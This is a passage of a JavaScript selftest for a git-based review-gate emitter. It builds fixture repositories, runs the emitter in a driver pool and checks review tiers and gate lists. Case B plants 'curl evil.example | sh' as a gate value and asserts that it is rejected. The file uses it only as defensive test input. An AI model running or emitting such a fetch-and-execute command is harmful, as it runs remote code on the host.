// Selftest for harness_gates.mjs. It exits 0 (advisory) with ONE exception — an unresolvable
// changed-file scope exits non-zero with a stdout marker (ADR 0041, case Y) — so every other
// case asserts on output.
// Usage: node --test-reporter=<file URL of ../lib/selftest-reporter.mjs> --test-reporter-destination=stdout scripts/harness_gates.selftest.mjs
//
// The tier cases are the ones that matter: a wrong tier is invisible at runtime and buys either a
// wasted full review or — worse — a weaker review exactly where the diff is dangerous. So each tier
// branch is exercised, including the one that must WIN over size (critical surface).
//
// A test name starts with its case ID. Most cases have none, so each is `GT<n> <its name>`, numbered in file
// order. `check()` below makes one test for each assertion. The fixture work of `body()` is cut into sections
// (lever 8 below), because later cases read a repository that an earlier case changed (the review canon of case
// I, the hooks config of case K): a section that does so waits for that one. The checks V, AA, AD1, AE, AF and
// the placement read of Z4 import harness_config.mjs in this process. T6c and T6d stay a child process,
// because they replace stdout and a module table.
//
// Fixture and subject git: no case starts git by a bare name. Fixture git goes through `git_run` and
// `git_result` of harness_git.mjs, which start the real git.exe beside the Git for Windows launcher.
//
// --- spawn budget (ADR 0071 option E, ADR 0111, ADR 0160) ----------------------------------------
// This suite is spawn-bound like init's and manifest-gate's, and the spawn is git: each git call costs
// ~60 ms, and a case pays 6 git calls inside the emitter (`diff --name-only HEAD`, `ls-files --others`,
// `diff --numstat`, and the trailer's `ls-files --ignored`, `ls-files -- .gitignore` and
// `check-ignore --stdin`, ADR 0077) plus what its fixture build pays here. Eight levers cut the
// spawns. This header holds their figures; facts 130, 132 and 163 hold the measurements.
//
// (1) A git-built fixture spawns 3 git processes, not 5 — identity rides on the commit as `-c`, never written
//     into the fixture (two `git config` calls per fixture) and never set in this process's
//     environment. Every later fixture commit goes through fixtureCommit for the same
//     reason: it must work where NO global identity exists — CI runners — so no site may rely on a
//     repo-local identity.
// (2) On Windows the `git` on PATH is Git for Windows' cmd\git.exe, a LAUNCHER that spawns
//     mingw64\bin\git.exe and waits — two processes per call. A `status` x10 costs
//     68 ms via the launcher and 49 ms direct. harness_git.mjs starts the real binary itself (ADR 0223), so
//     every fixture call here and every call of the emitter takes the direct route and this suite
//     touches no PATH. It is the worker binary the launcher would spawn, and it resolves the same
//     way: both entry points print the same `--exec-path` and the same `--system`
//     gitconfig origin (`git config --system --show-origin --list`) — only the hop is gone.
// (3) A fixture commit passes `-c maintenance.auto=false -c gc.auto=0`. On git 2.53 every commit
//     starts a detached `git maintenance run --auto` (fact 130): 111 of a run's 1,150 git processes
//     (GIT_TRACE2), each one free to write under a fixture's .git while the suite moves on or removes
//     the root. ABBA x4 on a loaded box: the pinned run was faster in every
//     pair, median −12 s of ~170 s (~7%). The pins ride on the command line, not in
//     GIT_CONFIG_COUNT, so the emitter's own git calls run with the environment a member's run has.
//     Case FX proves the switch-off (fact 132).
//
// --- the in-process runner (ADR 0160) ------------------------------------------------------------
// (4) A child emitter run costs 334 ms, a `main()` call in a warm interpreter 222 ms (20 runs each):
//     ~125 runs, ~14 s. So one node process imports harness_gates once and runs
//     each request through `main()`: argv, the caller's whole environment and cwd at call time, stdout and
//     stderr captured, and the exit code `main()` returns. Each request is one ASCII JSON line on
//     stdin and one on stdout. A child's output puts stderr first, because the child line-buffers its stderr
//     and block-buffers a piped stdout; the reply text is rebuilt in that order.
//     Child-only, never the driver: J (the environment is read at interpreter start) and the RUN
//     cases at the end, which run their repos both ways and compare. HARNESS_GATES_SELFTEST_RUNNER
//     = 'child' forces every run into a child (ADR 0111 §3 fallback), and 'both' runs every call both
//     ways and fails on any difference.
//     Fail closed: a driver that gives no reply in 120 s, ends, or breaks the
//     protocol is a FAIL, and the later calls run as children so the other cases still report. The
//     protocol keeps its own copy of fd 1; the emitter's fd 1 and 2 writes through fs.writeSync are
//     diverted to a stray buffer, so a write that bypasses process.stdout/process.stderr is a FAIL, not a
//     desync or a silent loss. A request that changes a module global of harness_gates or harness_config (a
//     cache, a mutated table) is a FAIL: the next call would see it, and a child never does. A reply
//     whose stream order a child could print differently (stdout flushed, or past 4 KiB, under the
//     8 KiB pipe buffer) is run again as a child, counted in the closing note.
// (5) newRepo copies one `.git` that `git init --template=<empty dir>` made, in place of a `git init`
//     per fixture: 76 ms a spawn against 18 ms a copy, 101 fixtures. The copy
//     carries no sample hooks, no `info/exclude` and no `description`; no git command the emitter runs
//     reads them, and AC5 creates `info/exclude` itself. The template is made on the fixture root's
//     own volume, so `core.ignorecase`, `core.symlinks` and `core.filemode` are probed where they apply.
// (6) newRepo copies a seed repository in place of two git spawns (`add -A`, `commit`) per fixture. `getSeedRepo`
//     builds one seed for each distinct config text, once, with real git, and `fs.cpSync` copies it, `.git` included.
//     The suite owns no git object or index writer. Case FX keeps the direct git path (`newRepoGit`), because FX
//     proves what a git commit starts.
// (7) The driver of lever 4 is a pool of up to four. A section takes an idle driver for one request and gives it
//     back, so the runs of sections that go beside each other do not queue behind one process. A request carries
//     its own argv, environment and cwd, so no driver depends on what another one did.
// (8) `body()` is a list of sections, each the code of one case group, started in source order,
//     at most POOL + 2 at a time. Most of the 101 fixtures belong to one group and read nothing of another, so the
//     emitter runs of the groups overlap. The tests register in source order after the last section ends (`reg`,
//     `runSections`), so the output and the `GT<n>` numbers are those of a serial run.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { spawn, spawnSync } from 'node:child_process'
import os from 'node:os'
import { AsyncLocalStorage } from 'node:async_hooks'
import { createHash } from 'node:crypto'
import { isDeepStrictEqual } from 'node:util'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { fixtureRoot, removeFixtureRoot, runNode, toRx, innerJobs, shortAlias } from '../lib/selftest-lib.mjs'
import { git_run, git_result, which_on_path } from './harness_git.mjs'

const here = path.dirname(fileURLToPath(import.meta.url))
const gatesPath = path.join(here, 'harness_gates.mjs')
const win = process.platform === 'win32'
const BS = String.fromCharCode(92)
const P = String.raw
const fx = fixtureRoot('harness-gates-selftest')
const hc = await import(pathToFileURL(path.join(here, 'harness_config.mjs')).href)

// --- assertions ----------------------------------------------------------------------------------------
// m / nm are the .NET -match / -notmatch of one string (toRx: the -match rules), anyLine the -match of an array.
const m = (text, pat) => toRx(pat).test(String(text ?? ''))
const nm = (text, pat) => !m(text, pat)
const anyLine = (ls, pat) => ls.some((l) => toRx(pat).test(l))
const lines = (text) => String(text ?? '').split('\n')
const rep = (text, a, b) => text.split(a).join(b)
const count = (text, rx) => (String(text).match(rx) ?? []).length
// The lines of an emitter run that sit in the gate-command window: four spaces and a non-space, non-paren
// character. The warn lines legitimately echo every refused value, so most cases drop them first.
const CMD = P`^\s{4}[^ (]`
const WARN = P`^\s*warn:`
const cmdLines = (out, skipWarn = true) => lines(out).filter((l) => (!skipWarn || nm(l, WARN)) && m(l, CMD))

// One assertion: one test, one name, the verdict taken now. `detail` is what the failure prints.
// A section of body() runs beside the others (see runSections), so it must not register a test straight away: the
// order of the output and the GT numbers would then follow the clock. Inside a section every test goes into that
// section's list (AsyncLocalStorage carries the list through the awaits), and runSections registers the lists in
// source order after the last section ends. `gt` marks a case with no ID: `GT<n> <name>`,
// numbered when it registers.
const sink = new AsyncLocalStorage()
let gtN = 0
function reg(name, opts, fn, gt = false) {
  const e = { name, opts, fn, gt }
  const list = sink.getStore()
  if (list) list.push(e)
  else emit(e)
}
function emit(e) {
  const name = e.gt ? `GT${++gtN} ${e.name}` : e.name
  if (e.opts) test(name, e.opts, e.fn)
  else test(name, e.fn)
}
function check(name, cond, detail = '', gt = false) {
  const ok = Boolean(cond)
  const why = String(detail)
  reg(name, null, () => { assert.ok(ok, why || 'the assertion is false') }, gt)
}
const g = (name, cond, detail = '') => check(name, cond, detail, true)

// --- the fixture lifecycle ---------------------------------------------------------------------------
// The fixture root and the driver go at the end of the file (see the last lines).
const put = (root, rel, text = 'x') => {
  const p = path.join(root, rel)
  fs.mkdirSync(path.dirname(p), { recursive: true })
  fs.writeFileSync(p, text)
  return p
}
const rd = (root, rel) => fs.readFileSync(path.join(root, rel), 'utf8')
const edit = (root, rel, a, b) => put(root, rel, rep(rd(root, rel), a, b))
const L = (...ls) => ls.join('\n')

// Every fixture git call goes through harness_git.mjs. `traceEnv` is set only while case FX traces a build.
let traceEnv = null
const genv = (extra) => (traceEnv || extra ? { ...traceEnv, ...extra } : null)
const gitRun = (root, args, env) => git_run(root, args, { env: genv(env) })
const gitq = (root, args, env) => git_result(root, args, { env: genv(env) })   // the exit status is ignored
const gitLines = (root, args) => gitRun(root, args).split('\n').filter((l) => l.trim() !== '')
// A fixture commit that FAILS is not a fixture: every current site's next assertion would go red
// (the file it added stays untracked and changes the diff), but the helper does not lean on that —
// a non-zero exit throws with git's own message, so an abort ends the suite rather
// than letting a later site with no diff-sensitive assertion read green.
const COMMIT_PINS = ['-c', 'user.email=selftest@example.invalid', '-c', 'user.name=selftest', '-c', 'maintenance.auto=false', '-c', 'gc.auto=0']
function fixtureCommit(repo, message) {
  try { gitRun(repo, ['add', '-A']) } catch (e) { throw new Error(`fixture add failed in ${repo}: ${e.stderr ?? e.message}`) }
  try { gitRun(repo, [...COMMIT_PINS, 'commit', '-q', '-m', message]) } catch (e) { throw new Error(`fixture commit '${message}' failed in ${repo}: ${e.stderr ?? e.message}`) }
}

let repoTemplate = null
function getRepoTemplate() {
  if (repoTemplate !== null) return repoTemplate
  const empty = path.join(fx, '.template-empty')
  const t = path.join(fx, '.template-repo')
  fs.mkdirSync(empty, { recursive: true })
  try { gitRun(fx, ['init', '-q', `--template=${empty}`, t]) } catch (e) { throw new Error(`fixture template init failed: ${e.stderr ?? e.message}`) }
  repoTemplate = path.join(t, '.git')
  return repoTemplate
}
// The git path of newRepo: two git spawns (`add -A`, `commit`). Case FX needs it, because FX proves what a git commit starts.
function newRepoGit(name, config, files = []) {
  const p = path.join(fx, name)
  fs.mkdirSync(p, { recursive: true })
  // .harness.json goes in BEFORE the seed commit. Written afterwards, it stays untracked, counts as a
  // changed file and puts every file-count and tier assertion off by one: the config file would silently
  // join the diff it configures.
  if (config) fs.writeFileSync(path.join(p, '.harness.json'), config)
  fs.cpSync(getRepoTemplate(), path.join(p, '.git'), { recursive: true, force: true })
  fs.writeFileSync(path.join(p, 'seed.txt'), 'seed')
  fixtureCommit(p, 'seed')
  for (const f of files) put(p, f, 'x')
  return p
}
// Seed repositories, built by real git and copied with `fs.cpSync` (lever 6 of the header). A copied directory with its
// `.git` is a real repository: the copy gets new mtimes, so the index entries read as stat-dirty and git compares
// content, and an edit that keeps the size cannot read as clean. A fixture without a config copies the plain seed
// (`seed.txt` only). A fixture with a config copies the seed of that config text: one more commit made once per
// distinct text, by writing the text over the placeholder `.harness.json` of a seed and amending the commit with
// `commit -a` (one git spawn). The config is in the seed commit, never written afterwards: a `.harness.json` that lands
// after the commit would count as a changed file and move every file-count and tier assertion by one.
const seedRepos = new Map()
const PLACEHOLDER = '{ "seed": true }'
// The plain seed, and the seed whose commit holds a `.harness.json` that a config seed then replaces: both go through
// `add -A` and `commit`. `withConfig` is the placeholder text, or null for the plain one.
function buildSeed(id, withConfig) {
  const dir = path.join(fx, `.seed-${id}`)
  fs.mkdirSync(dir, { recursive: true })
  if (withConfig !== null) fs.writeFileSync(path.join(dir, '.harness.json'), withConfig)
  fs.cpSync(getRepoTemplate(), path.join(dir, '.git'), { recursive: true, force: true })
  fs.writeFileSync(path.join(dir, 'seed.txt'), 'seed')
  fixtureCommit(dir, 'seed')
  return dir
}
function getSeedRepo(config) {
  const key = config || ''
  const known = seedRepos.get(key)
  if (known !== undefined) return known
  let dir
  if (key === '') dir = buildSeed('plain', null)
  else {
    if (!seedRepos.has(PLACEHOLDER)) seedRepos.set(PLACEHOLDER, buildSeed('placeholder', PLACEHOLDER))
    dir = path.join(fx, `.seed-${seedRepos.size}`)
    fs.cpSync(seedRepos.get(PLACEHOLDER), dir, { recursive: true, force: true })
    fs.writeFileSync(path.join(dir, '.harness.json'), key)
    try { gitRun(dir, [...COMMIT_PINS, 'commit', '-q', '-a', '--amend', '--no-edit']) } catch (e) { throw new Error(`fixture config commit failed in ${dir}: ${e.stderr ?? e.message}`) }
  }
  seedRepos.set(key, dir)
  return dir
}
function newRepo(name, config, files = []) {
  const p = path.join(fx, name)
  fs.mkdirSync(p, { recursive: true })
  fs.cpSync(getSeedRepo(config), p, { recursive: true, force: true })
  for (const f of files) put(p, f, 'x')
  return p
}

// --- the emitter runner ------------------------------------------------------------------------------
// The child environment: the caller's, plus the overrides of one call, without the test-runner context.
// Never printed.
const childEnv = (extra) => {
  const e = { ...process.env, ...extra }
  delete e.NODE_TEST_CONTEXT
  return e
}
// What a child's output makes of the same bytes: one string per line, each ended by a newline.
function toChildText(t) {
  const s = String(t ?? '')
  if (s.length === 0) return ''
  const ls = s.split(/\r?\n/u)
  if (s.endsWith('\n')) ls.pop()
  return `${ls.join('\n')}\n`
}
// ASCII JSON: a code unit above 0x7e travels as a \u escape, so no line separator reaches the driver's reader raw.
function asciiJson(v) {
  const s = JSON.stringify(v)
  let o = ''
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i)
    o += c < 0x7f ? s[i] : `${BS}u${c.toString(16).padStart(4, '0')}`
  }
  return o
}

const drvScript = path.join(fx, 'gates_driver.mjs')
fs.writeFileSync(drvScript, P`import fs from 'node:fs'
import path from 'node:path'
import readline from 'node:readline'
import { pathToFileURL } from 'node:url'
const scripts = process.argv[2]
const home = process.cwd()
const entry = path.join(scripts, 'harness_gates.mjs')
const protoOut = process.stdout.write.bind(process.stdout)
const hg = await import(pathToFileURL(entry).href)
const hc = await import(pathToFileURL(path.join(scripts, 'harness_config.mjs')).href)
const ops0 = { ...hg.ops }
const repr = (v) => JSON.stringify(v, (k, x) => x instanceof Set ? { set: [...x] } : x instanceof Map ? { map: [...x] } : x instanceof RegExp ? String(x) : x)
function state() {
  const snap = { 'harness_gates.ops': Object.keys(ops0).map((k) => hg.ops[k] === ops0[k]).join() }
  for (const [name, ns] of [['harness_gates', hg], ['harness_config', hc]]) {
    for (const [k, v] of Object.entries(ns)) {
      if (typeof v === 'function') continue
      snap[name + '.' + k] = String(repr(v))
    }
  }
  return snap
}
const baseline = state()
const text = (c) => (typeof c === 'string' ? c : Buffer.from(c).toString('utf8'))
const done = (e, cb) => { const f = typeof e === 'function' ? e : cb; if (typeof f === 'function') f() }
const rl = readline.createInterface({ input: process.stdin, crlfDelay: Infinity })
for await (const line of rl) {
  const req = JSON.parse(line)
  for (const k of Object.keys(process.env)) delete process.env[k]
  Object.assign(process.env, req.env)
  process.chdir(req.cwd)
  process.argv[1] = entry
  let out = ''
  let err = ''
  let all = ''
  let stray = ''
  const wOut = process.stdout.write
  const wErr = process.stderr.write
  const wSync = fs.writeSync
  process.stdout.write = (c, e, cb) => { const t = text(c); out += t; all += t; done(e, cb); return true }
  process.stderr.write = (c, e, cb) => { const t = text(c); err += t; all += t; done(e, cb); return true }
  fs.writeSync = (fd, ...rest) => { if (fd === 1 || fd === 2) { stray += text(rest[0]); return 0 } return wSync(fd, ...rest) }
  let code
  try {
    const r = hg.main(req.argv)
    code = r === undefined || r === null ? 0 : r
  } catch (e) {
    const t = String((e && e.stack) || e) + '\n'
    err += t
    all += t
    code = 1
  } finally {
    process.stdout.write = wOut
    process.stderr.write = wErr
    fs.writeSync = wSync
  }
  process.chdir(home)
  const now = state()
  const leaked = Object.keys({ ...baseline, ...now }).sort().filter((k) => baseline[k] !== now[k])
  protoOut(JSON.stringify({ out, err, all, code, stray, leaked, unordered: false }) + '\n')
}
`)
let runnerMode = ['child', 'both'].includes(process.env.HARNESS_GATES_SELFTEST_RUNNER) ? process.env.HARNESS_GATES_SELFTEST_RUNNER : 'driver'
// A pool of drivers (lever 7 of the header): a section takes an idle driver for one request, so sections that run
// beside each other do not queue behind one process. Each driver is the warm interpreter of lever 4.
const POOL = innerJobs(4, 1)
const idleDrivers = []
const driverWaiters = []
const allDrivers = new Set()
let childRerun = 0

function startDriver() {
  const child = spawn(process.execPath, [drvScript, here], { cwd: here, stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true, env: childEnv({}) })
  const st = { child, buf: '', lines: [], waiter: null, ended: false, err: '' }
  const deliver = (line) => {
    if (st.waiter) { const w = st.waiter; st.waiter = null; w(line) } else st.lines.push(line)
  }
  child.stdout.setEncoding('utf8')
  child.stdout.on('data', (d) => {
    st.buf += d
    for (let i = st.buf.indexOf('\n'); i >= 0; i = st.buf.indexOf('\n')) {
      const line = st.buf.slice(0, i)
      st.buf = st.buf.slice(i + 1)
      deliver(line)
    }
  })
  child.stderr.setEncoding('utf8')
  child.stderr.on('data', (d) => { st.err += d })
  child.stdin.on('error', () => {})
  child.on('close', () => { st.ended = true; deliver(null) })
  child.on('error', (e) => { st.err += String(e.message); st.ended = true; deliver(null) })
  return st
}
function nextLine(st) {
  return new Promise((resolve, reject) => {
    if (st.lines.length) { resolve(st.lines.shift()); return }
    if (st.ended) { resolve(null); return }
    const timer = setTimeout(() => { st.waiter = null; reject(new Error('no reply within 120 s')) }, 120000)
    st.waiter = (line) => { clearTimeout(timer); resolve(line) }
  })
}
async function stopOne(st, kill) {
  allDrivers.delete(st)
  const exited = new Promise((resolve) => { if (st.ended) resolve(); else st.child.once('close', resolve) })
  try { st.child.stdin.end() } catch { /* already closed */ }
  if (kill) { try { st.child.kill() } catch { /* already gone */ } }
  const t = setTimeout(() => { try { st.child.kill() } catch { /* already gone */ } }, 5000)
  await exited
  clearTimeout(t)
}
async function stopDriver(kill = false) {
  idleDrivers.length = 0
  await Promise.all([...allDrivers].map((st) => stopOne(st, kill)))
}
// An idle driver, a new one while the pool has room, else the next one to be released.
async function takeDriver() {
  const idle = idleDrivers.pop()
  if (idle) return idle
  if (allDrivers.size < POOL) { const st = startDriver(); allDrivers.add(st); return st }
  return new Promise((resolve) => { driverWaiters.push(resolve) })
}
// A driver that ended or broke the protocol is dropped, and a waiter gets a new one in its place.
function giveBack(st, broken) {
  if (broken) {
    stopOne(st, true).catch(() => {})
    const w = driverWaiters.shift()
    if (w) { const nst = startDriver(); allDrivers.add(nst); w(nst) }
    return
  }
  const w = driverWaiters.shift()
  if (w) w(st)
  else idleDrivers.push(st)
}
async function gatesDriver(repo, extra, { cwd, env } = {}) {
  const st = await takeDriver()
  let broken = true
  try {
    const req = { argv: ['--repo', repo, ...extra], env: childEnv(env), cwd: cwd ?? process.cwd() }
    st.child.stdin.write(`${asciiJson(req)}\n`, 'utf8')
    const line = await nextLine(st)
    if (line === null) throw new Error(`the driver ended: ${st.err}`)
    const r = JSON.parse(line)
    if (r.stray) throw new Error(`the emitter wrote past process.stdout/process.stderr: ${r.stray}`)
    if (r.leaked.length) throw new Error(`the call changed module state that the next call would see: ${r.leaked.join(', ')}`)
    broken = false
    return { Out: toChildText(r.all), StdOut: toChildText(r.out), Err: toChildText(r.err), Code: Number(r.code), Unordered: Boolean(r.unordered) }
  } finally {
    giveBack(st, broken)
  }
}
// The RUN cases compare each stream on its own: the order of a line on each stream between the two pipes is
// not fixed, the order inside one stream is. A child's Out puts stderr first, as the note of lever (4) says.
function gatesChild(repo, extra, { cwd, env } = {}) {
  const r = runNode([gatesPath, '--repo', repo, ...extra], { cwd, env: childEnv(env) })
  return { Out: toChildText(r.stderr) + toChildText(r.stdout), StdOut: toChildText(r.stdout), Err: toChildText(r.stderr), Code: r.status }
}
async function gates(repo, extra = [], opts = {}) {
  if (opts.child || runnerMode === 'child') return gatesChild(repo, extra, opts)
  let d
  try { d = await gatesDriver(repo, extra, opts) } catch (e) {
    check('RUN driver: every emitter call through the driver returns a clean reply', false, `--repo ${repo} ${extra.join(' ')}: ${String(e.message).trim()} — every later run is a child`)
    runnerMode = 'child'
    return gatesChild(repo, extra, opts)
  }
  if (d.Unordered) { childRerun++; return gatesChild(repo, extra, opts) }
  if (runnerMode === 'both') {
    // Per stream, as in RUN1-RUN4: a joined compare races on the pipe arrival order.
    const c = gatesChild(repo, extra, opts)
    check(`RUN both: driver = child for --repo ${repo} ${extra.join(' ')}`, c.StdOut === d.StdOut && c.Err === d.Err && c.Code === d.Code,
      `child exit=${c.Code}\nstdout:\n${c.StdOut}stderr:\n${c.Err}--- driver exit=${d.Code}\nstdout:\n${d.StdOut}stderr:\n${d.Err}`)
  }
  return d
}
console.log(`note [harness_gates] runner: ${runnerMode} (ADR 0160)`)

const CFG = P`{
  "review": {
    "canon": "REVIEW.md",
    "docs_only": ["^docs/", "^[^/]*\\.md$"],
    "harness_layer": ["^\\.harnessdir/"],
    "critical": ["^migrations/"]
  },
  "groups": [
    { "name": "api", "match": "^api/.*\\.py$", "cwd": "api", "strip_prefix": "api/", "gates": ["ruff", "pytest-nondb"] },
    { "name": "web", "match": "^web/.*\\.ts$", "cwd": "web", "strip_prefix": "web/", "gates": ["eslint", "tsc"] }
  ]
}`

// --- the sections (lever 8) ----------------------------------------------------------------------------------
// body() is a list of sections, one for each case group, in source order. A section names the sections
// that it must wait for (`after`): the one that sets a variable it reads, and every earlier one that touches the same
// fixture repository. The rest run beside each other, SECTIONS at a time, while each takes a driver of the pool for
// one request. A section that reads a variable another section sets, or changes a repository another section reads,
// lists that section in `after`; the order of the output does not depend on the schedule, because the lists of
// tests register in source order once every section has ended. A section that fails is reported by ABORT1, and the
// sections that wait for it are skipped.
const SECTIONS = POOL + 2
async function runSections(list) {
  const byName = new Map(list.map((s) => [s.name, s]))
  let free = SECTIONS
  const waiting = []
  const take = () => (free > 0 ? (free--, Promise.resolve()) : new Promise((resolve) => { waiting.push(resolve) }))
  const release = () => { const w = waiting.shift(); if (w) w(); else free++ }
  for (const s of list) {
    s.tests = []
    s.error = null
    s.done = (async () => {
      for (const a of s.after) {
        const d = byName.get(a)
        await d.done
        if (d.error) { s.error = new Error(`skipped: section ${a} failed first`); s.skipped = true; return }
      }
      await take()
      try { await sink.run(s.tests, s.fn) } catch (e) { s.error = e } finally { release() }
    })()
  }
  await Promise.all(list.map((s) => s.done))
  for (const s of list) for (const e of s.tests) emit(e)
  const failed = list.filter((s) => s.error && !s.skipped)
  if (failed.length) {
    const e = failed[0].error
    throw new Error(`section ${failed.map((s) => s.name).join(', ')} failed: ${(e && e.stack) || e}`)
  }
}
async function body() {
  let repoA, rA, FENCE, BT, NOT_IMPORTED, repoK, rK2, CFG_ROUTES, CFG_FILES, newArtCfg, SURL, numbered, repoT2, rG2, repoF, repoT6, CFG_DER, CFG_X, CFG_X7, repoY1, repoY3, repoZ1, newAb, abItem, abCheck, abSrc, newIgnRepo, CFG_AC, repoAC1, repoAC5b, newAcConfig, getTreeLine, getRunBlock, fwd, runBash, bashExe, ciLines, repoS2
  const sections = []
  const section = (name, after, fn) => { sections.push({ name, after, fn }) }
  section('FX', [], async () => {
  // --- FX: a fixture commit starts no auto maintenance (header lever 3) -----------------------------
  // The switch-off is silent when it breaks: every case stays green and only the time and the race
  // come back. So one fixture build runs under a trace2 event file, and no child it records may be a
  // `maintenance` or `gc` run. An unpinned control commit in the same repo then shows whether this git
  // starts one at all: where it does not, FX passes vacuously and says so in a SKIP line. The control
  // leaves one detached run behind, in a repo no later case reads. A GIT_TRACE2_EVENT set outside the
  // suite is never touched: the trace rides on the environment of the traced calls only, so the cases
  // after FX run in the caller's environment.
  const getFxTrace = (trace, run) => {
    traceEnv = { GIT_TRACE2_EVENT: trace }
    let code = null
    try { code = run() } finally { traceEnv = null }
    const events = fs.existsSync(trace) ? fs.readFileSync(trace, 'utf8').split(/\r?\n/u) : []
    return {
      Exit: code,
      Commits: events.filter((e) => /"event":"start"/iu.test(e) && /"commit"/iu.test(e)).length,
      Children: events.filter((e) => /"event":"child_start"/iu.test(e) && /"(maintenance|gc)"/iu.test(e)),
    }
  }
  let fxRepo = null
  const fxPinned = getFxTrace(path.join(fx, 'fx-trace2-pinned.json'), () => { fxRepo = newRepoGit('fx-no-maintenance', '', []); return 0 })
  const fxControl = getFxTrace(path.join(fx, 'fx-trace2-control.json'), () =>
    gitq(fxRepo, ['-c', 'user.email=selftest@example.invalid', '-c', 'user.name=selftest', 'commit', '-q', '--allow-empty', '-m', 'control']).status)
  g('FX a fixture commit is traced and starts no maintenance or gc child', fxPinned.Commits >= 1 && fxPinned.Children.length === 0,
    `commit starts=${fxPinned.Commits} children=[${fxPinned.Children.join(' | ')}]`)
  if (fxControl.Exit === 0 && fxControl.Commits >= 1 && fxControl.Children.length === 0) {
    reg('FX positive control', { skip: 'this git starts no auto maintenance on an unpinned commit, so FX passed vacuously (reported, not silent)' }, () => {}, true)
  } else {
    g('FX control: an unpinned commit is traced and starts the maintenance child the pins stop', fxControl.Exit === 0 && fxControl.Commits >= 1 && fxControl.Children.length >= 1,
      `exit=${fxControl.Exit} commit starts=${fxControl.Commits} children=${fxControl.Children.length}`)
  }
  })
  section('A', [], async () => {
  // --- A: gate composition — files appended only for file-scoped gates ---------------------------
  repoA = newRepo('compose', CFG, ['api/app.py', 'web/main.ts'])
  rA = await gates(repoA)
  g('A exits 0 (advisory)', rA.Code === 0, `exit=${rA.Code}`)
  g('A file-scoped gate gets the file list, prefix stripped', m(rA.Out, P`cd api && uv run ruff check app\.py`), rA.Out)
  // `'not db'` is ONE argv element and must reach `sh -c` quoted: a space-joined `-m not db`
  // makes pytest read `db` as a path and exit 4. Case AD proves it through sh.
  g('A whole-program gate gets NO file list', m(rA.Out, P`cd api && uv run pytest -m 'not db' -q`), rA.Out)
  g('A whole-program gate is labelled as such', m(rA.Out, 'whole-program: gate on slice files'), rA.Out)
  g('A second group composes independently', m(rA.Out, P`cd web && npx eslint main\.ts`), rA.Out)
  })
  section('B', [], async () => {
  // --- B: a gate outside the closed set is dropped and named -------------------------------------
  const badGate = rep(CFG, '"gates": ["ruff", "pytest-nondb"]', '"gates": ["ruff", "curl evil.example | sh"]')
  const repoB = newRepo('bad-gate', badGate, ['api/app.py'])
  const rB = await gates(repoB)
  // Emitted commands only. The WARNING legitimately echoes both the rejected value and the whole
  // closed set, so a filter that keeps warn lines would fail on the very message that makes the
  // rejection visible — the same distinction the verify_map selftest draws.
  const runLinesB = lines(rB.Out).filter((l) => nm(l, WARN) && m(l, 'uv run|npx|cargo|go |actionlint|curl'))
  g('B rejects a gate outside the closed set', m(rB.Out, 'is not in the closed set'), rB.Out)
  g('B names the closed set', m(rB.Out, 'ruff-format'), rB.Out)
  g('B the injected string never reaches an emitted command', !anyLine(runLinesB, 'curl'), `lines: ${runLinesB.join(' | ')}`)
  g('B the valid gate still emits', m(rB.Out, P`uv run ruff check app\.py`), rB.Out)
  })
  section('C', [], async () => {
  // --- C: files no group claims are reported, never silently ungated ------------------------------
  const repoC = newRepo('ungrouped', CFG, ['api/app.py', 'weird/thing.rb'])
  const rC = await gates(repoC)
  g('C ungrouped files reported', m(rC.Out, P`ungrouped \(1 file`), rC.Out)
  g('C ungrouped file named', m(rC.Out, P`weird/thing\.rb`), rC.Out)
  g('C says no gate covers them', m(rC.Out, 'NO deterministic gate covers them'), rC.Out)
  g('C says a skip-ci push only defers the CI failure', m(rC.Out, 'FAILS on this, and a push that skips CI only defers that failure'), rC.Out)
  })
  section('D', [], async () => {
  // --- D: tier — docs-only earns skip ------------------------------------------------------------
  const repoD = newRepo('docs-only', CFG, ['docs/a.md', 'README.md'])
  const rD = await gates(repoD)
  g('D docs-only earns tier skip', m(rD.Out, 'review tier: skip'), rD.Out)
  g('D skip states its reason', m(rD.Out, 'declared docs surface'), rD.Out)
  })
  section('E', [], async () => {
  // --- E: tier — harness-layer earns small -------------------------------------------------------
  const repoE = newRepo('harness', CFG, ['.harnessdir/hook.ps1'])
  const rE = await gates(repoE)
  g('E harness-layer earns tier small', m(rE.Out, 'review tier: small'), rE.Out)
  g('E small states the harness reason', m(rE.Out, 'confined to the declared harness layer'), rE.Out)
  })
  section('F', [], async () => {
  // --- F: tier — a critical surface WINS over a small size ---------------------------------------
  // One tiny file. Size alone would say small; criticality must override it.
  repoF = newRepo('critical', CFG, ['migrations/001.sql'])
  const rF = await gates(repoF)
  g('F critical surface forces tier full', m(rF.Out, 'review tier: full'), rF.Out)
  g('F says size never overrides criticality', m(rF.Out, 'size never overrides criticality'), rF.Out)
  g('F names the critical file', m(rF.Out, P`migrations/001\.sql`), rF.Out)
  })
  section('G', [], async () => {
  // --- G: tier — size-based small vs full --------------------------------------------------------
  const repoG = newRepo('small-size', CFG, ['api/app.py'])
  const rG = await gates(repoG)
  g('G small diff earns tier small with counts', m(rG.Out, P`review tier: small — 1 file\(s\) / \d+ changed line\(s\)`), rG.Out)

  const manyFiles = [1, 2, 3, 4, 5, 6, 7].map((i) => `api/f${i}.py`)
  const repoG2 = newRepo('big-size', CFG, manyFiles)
  rG2 = await gates(repoG2)
  check('G2 too many files earns tier full', m(rG2.Out, P`review tier: full — 7 file\(s\)`), rG2.Out)
  })
  section('H', [], async () => {
  // --- H: undeclared review surfaces warn rather than pretending -----------------------------------
  const repoH = newRepo('no-surfaces', '{ "groups": [] }', ['api/app.py'])
  const rH = await gates(repoH)
  g('H no declared surfaces warns the tier rests on size', m(rH.Out, 'no review surfaces declared'), rH.Out)
  g('H still exits 0', rH.Code === 0, `exit=${rH.Code}`)
  })
  section('I', ['A'], async () => {
  // --- I: a missing review canon is named, not assumed -------------------------------------------
  g('I missing review canon is called out', m(rA.Out, 'NOT FOUND'), rA.Out)
  put(repoA, 'REVIEW.md', '# invariants')
  const rI = await gates(repoA)
  g('I present review canon is not flagged', nm(rI.Out, 'NOT FOUND'), rI.Out)
  })
  section('I2', [], async () => {
  // --- I2: the canon line says whether CLAUDE.md imports the canon (ywr-harness ADR 0215) ----------------
  // /code-review reads CLAUDE.md and never the canon file, so a canon without an @-import is a review without it.
